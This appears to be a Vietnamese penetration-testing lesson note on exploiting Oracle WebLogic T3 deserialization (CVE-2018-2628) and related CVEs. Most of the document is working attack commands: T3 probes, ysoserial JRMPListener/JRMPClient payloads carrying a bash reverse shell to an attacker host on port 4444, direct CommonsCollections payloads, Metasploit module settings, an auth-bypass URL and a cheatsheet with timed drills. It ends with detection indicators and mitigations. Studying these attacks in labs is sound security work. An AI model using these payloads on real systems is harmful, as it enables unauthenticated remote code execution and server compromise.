---
title: "11. WebLogic T3 Protocol Deserialization (CVE-2018-2628)"
type: attack
tags: [pentest, deserialization, java, weblogic, t3, cve, lesson-11]
aliases: [WebLogic T3 Deserialization, CVE-2018-2628]
created: 2026-04-06
---

> **Prerequisites**: [[09-java-gadget-chains-ysoserial|09. Gadget Chains & ysoserial]]
> **Objectives**:
> - Hiểu T3 protocol — tại sao nó deserialize Java objects theo design
> - Thực hiện CVE-2018-2628 exploit qua T3 port 7001
> - Sử dụng JRMP listener để bypass blacklist cũ
> - Nhận biết các WebLogic CVE series và sự khác biệt

---

## Điều kiện khai thác

> [!note] Điều kiện bắt buộc
> - Oracle WebLogic Server versions: 10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3
> - TCP port 7001 (default T3) reachable từ attacker
> - **Không cần authentication** — T3 deserialization xảy ra pre-auth
> - Gadget library trong classpath (WebLogic bundle commons-collections)

> [!danger] Đây là một trong những lỗ hổng nghiêm trọng nhất trong enterprise security
> CVE-2019-2725 và CVE-2020-14882 (cùng series) được Lazarus Group (North Korea APT) và nhiều ransomware operator sử dụng. Cả hai đều nằm trong CISA Known Exploited Vulnerabilities catalog.

---

## Cơ chế tấn công

### T3 Protocol — Tại Sao Nguy Hiểm

![[assets/img-11-t3-protocol.png]]
*Hình 1: WebLogic T3 protocol attack path và CVE timeline. T3 deserialize Java objects theo design — đây là tính năng, không phải bug, cho đến khi user input không được validate.*

T3 (proprietary Oracle protocol) là nền tảng của WebLogic distributed computing — nó cho phép Java objects được serialize và transmit giữa JVM instances. Port 7001 luôn mở và accept T3 connections theo mặc định.

**Handshake sequence**:

```
Attacker → WebLogic: "t3 12.2.1\nAS:255\n..."
WebLogic → Attacker: "HELO:12.2.1.3.0.false\n..."
Attacker → WebLogic: [serialized Java object payload]
WebLogic: deserialize object → ClassTableEntry.readExternal() → readObject() → GADGET CHAIN
```

**CVE-2018-2628 specifically**: Bypass CVE-2017-3248 patch bằng cách dùng `java.rmi.activation.Activator` thay vì `java.rmi.registry.Registry` trong JRMP payload.

---

## Quy trình tấn công

**Môi trường giả định**: WebLogic Server tại `10.10.10.200:7001`.

### Bước 1 — Detect WebLogic và Version

```bash
# Nmap service detection
nmap -sV -p 7001,7002 --script weblogic-t3-info 10.10.10.200

# Thủ công qua HTTP console
curl -s http://10.10.10.200:7001/console/login/LoginForm.jsp | grep -i "weblogic\|version"

# T3 banner grab
echo -e "t3 12.2.1\nAS:255\nHL:19\n\n" | nc 10.10.10.200 7001 | strings | head -5
```

> **Expected output**: `HELO:10.3.6.0.171017.false` → WebLogic 10.3.6, potentially vulnerable.

### Bước 2 — URLDNS Probe Qua T3

```bash
# Generate URLDNS payload
java -jar ysoserial.jar URLDNS "http://wl-test.COLLAB.oastify.com" > /tmp/urldns.ser

# Tool WLT3Serial để gửi qua T3
git clone https://github.com/NetSPI/WLT3Serial
cd WLT3Serial
java -jar WLT3Serial.jar 10.10.10.200 7001 /tmp/urldns.ser
```

> **Expected output**: Burp Collaborator nhận DNS query → T3 deserialization confirmed.

### Bước 3 — CVE-2018-2628 (JRMP Two-Stage Attack)

CVE-2018-2628 dùng `JRMPClient` payload để khiến WebLogic kết nối về attacker's JRMPListener, sau đó listener gửi payload thực sự:

```bash
# Stage 1: Start JRMPListener trên attacker machine
LHOST="10.10.14.5"
JRMP_PORT="1234"

# Listener gửi CommonsBeanutils1 payload khi WebLogic kết nối về
java -cp ysoserial.jar ysoserial.exploit.JRMPListener $JRMP_PORT \
  CommonsBeanutils1 "bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" &

# Stage 2: Generate JRMPClient payload — gây WebLogic kết nối về JRMP port
java -jar ysoserial.jar JRMPClient "$LHOST:$JRMP_PORT" > /tmp/jrmp_client.ser

# Reverse shell listener
nc -lvnp 4444 &

# Stage 3: Deliver JRMPClient payload qua T3
java -jar WLT3Serial.jar 10.10.10.200 7001 /tmp/jrmp_client.ser
```

> **Expected output**: WebLogic kết nối về JRMPListener → listener gửi real payload → reverse shell nhận được.

### Bước 4 — Alternative: Direct Payload (CVE-2015-4852 Style)

Trên WebLogic versions cũ hơn chưa có blacklist:

```bash
# Direct CommonsCollections payload
java -jar ysoserial.jar CommonsCollections1 \
  "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" > /tmp/cc1.ser

java -jar WLT3Serial.jar 10.10.10.200 7001 /tmp/cc1.ser
```

### Bước 5 — Metasploit Module

```bash
msfconsole -q
use exploit/multi/misc/weblogic_deserialize
set RHOSTS 10.10.10.200
set RPORT 7001
set LHOST 10.10.14.5
set LPORT 4444
# Chọn target version
show targets
set TARGET 0  # WebLogic 10.3.x
run
```

---

## Biến thể & Bypass

### CVE-2019-2725 (Async Servlet — No T3 Needed)

```bash
# HTTP endpoint — không cần T3 port
# Target: /_async/AsyncResponseService hoặc /wls-wsat/CoordinatorPortType
curl -s http://10.10.10.200:7001/_async/AsyncResponseService \
  -H "Content-Type: text/xml" \
  --data-binary @weblogic_xxe_payload.xml

# Metasploit
use exploit/multi/http/weblogic_deserialize_asyncresponseservice
```

### CVE-2020-14882 (Auth Bypass + RCE Combo)

```bash
# Step 1: Auth bypass via URL encoding trick
curl -s "http://TARGET:7001/console/css/%252E%252E%252Fconsole.portal" \
  -H "Cookie: ADMINCONSOLESESSION=xxx"
# Trả về console không cần login

# Step 2: RCE via console command execution
# (kết hợp với CVE-2020-14883)
```

### Bypass Blacklist (CVE-2017-3248 Patch)

```bash
# CVE-2017-3248 chặn java.rmi.registry.Registry
# CVE-2018-2628 bypass bằng dùng java.rmi.activation.Activator
# ysoserial tự handle — chọn đúng payload:
java -jar ysoserial.jar JRMPClient2 "$LHOST:$JRMP_PORT" > jrmp2.ser
```

---

## Cây quyết định

```mermaid
flowchart TD
    A[Port 7001 mở trên target?] -->|Có| B[T3 banner grab<br>lấy version WebLogic]
    A -->|Không| Z1[Check 7002 SSL T3<br>hoặc non-standard port]
    B -->|10.3.x / 12.1.x| C[CVE-2015-4852<br>direct CC payload]
    B -->|12.2.1.x| D[CVE-2018-2628<br>JRMP two-stage]
    B -->|Post-2019| E[CVE-2019-2725<br>HTTP async endpoint]
    C -->|CC1 blacklisted| D
    D --> F[JRMPListener + JRMPClient]
    E --> G[/_async/ endpoint HTTP exploit]
    F -->|RCE| H[Shell → Enumerate → Escalate]
    G -->|RCE| H
    H --> I{WebLogic process user?}
    I -->|root| J[Immediate full compromise]
    I -->|weblogic/oracle| K[Enumerate domain, read configs, find creds]
```

---

## Command Cheatsheet

**Detect & Enum**

```bash
# Nmap WebLogic detection
nmap -sV -p 7001,7002 --script weblogic-t3-info TARGET

# T3 version banner
echo -e "t3 12.2.1\nAS:255\nHL:19\n\n" | nc TARGET 7001 | strings | grep HELO

# Check HTTP console
curl -sk http://TARGET:7001/console/login/LoginForm.jsp | grep -i version
```

**CVE-2018-2628 Two-Stage**

```bash
# Stage 1: JRMP Listener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 \
  CommonsBeanutils1 "bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'"

# Stage 2: JRMPClient payload to WebLogic
java -jar ysoserial.jar JRMPClient "LHOST:1234" > jrmp.ser
java -jar WLT3Serial.jar TARGET 7001 jrmp.ser

# Or direct (older WebLogic)
java -jar WLT3Serial.jar TARGET 7001 <(java -jar ysoserial.jar CC1 "cmd")
```

**CVE-2019-2725 HTTP**

```bash
# Check endpoint
curl -sk http://TARGET:7001/_async/AsyncResponseService

# Metasploit
use exploit/multi/http/weblogic_deserialize_asyncresponseservice
```

---

## Daily Drill

**Thời gian**: 15–20 phút/ngày trong 7 ngày.

**Drill 1 — T3 Banner Grab**
Mục tiêu: thuộc lòng T3 handshake string, nhận ra WebLogic version.

```bash
echo -e "t3 12.2.1\nAS:255\nHL:19\n\n" | nc TARGET 7001 | strings | head -5
# Expected: HELO:X.X.X.X.date.false
```

Luyện cho đến khi: không cần nhìn notes khi gõ T3 probe.

**Drill 2 — Full CVE-2018-2628 Flow**
Mục tiêu: thực hiện two-stage JRMP attack từ đầu đến khi có shell.

```bash
# 1. Start JRMPListener (background)
# 2. Generate JRMPClient payload
# 3. Deliver qua WLT3Serial
# 4. Catch reverse shell
```

Luyện cho đến khi: flow hoàn thành < 5 phút.

---

## Phát hiện & Phòng thủ

> [!warning] Detection Indicators
> **Network**: Inbound TCP 7001 connections không từ trusted app clients → suspicious
> **Network**: Outbound từ WebLogic server đến external IP trên port cao (JRMP callback) → likely exploited
> **Process**: `bash`, `cmd.exe`, hay process lạ spawn từ WebLogic JVM process
> **Log**: `ClassTableEntry` deserialization errors hoặc `InvalidClassException` liên quan gadget classes
>
> **SIEM rule**: Alert on outbound connections từ WebLogic process, đặc biệt sau inbound T3 connection bất thường

> [!note] Mitigation
> - Restrict T3 access: chỉ allow từ trusted app server IPs (WebLogic connection filter)
> - Apply Oracle Critical Patch Updates định kỳ
> - Disable T3 nếu không dùng distributed computing features
> - Network segmentation: WebLogic không được outbound connect ra internet
> - Monitor và alert trên `ClassTableEntry` deserialization exceptions

---

## Lab Thực hành

| Platform | Machine | Tại sao phù hợp |
|----------|---------|----------------|
| HTB | **Arkham** (Retired) | Java deserialization workflow tương tự |
| VulnHub | **WebLogic** images | Dedicated WebLogic vulnerable VMs |
| TryHackMe | **Java Deserialization** room | WebLogic trong context |
| SANS | **Holiday Hack** 2018 | Historical WebLogic challenge |
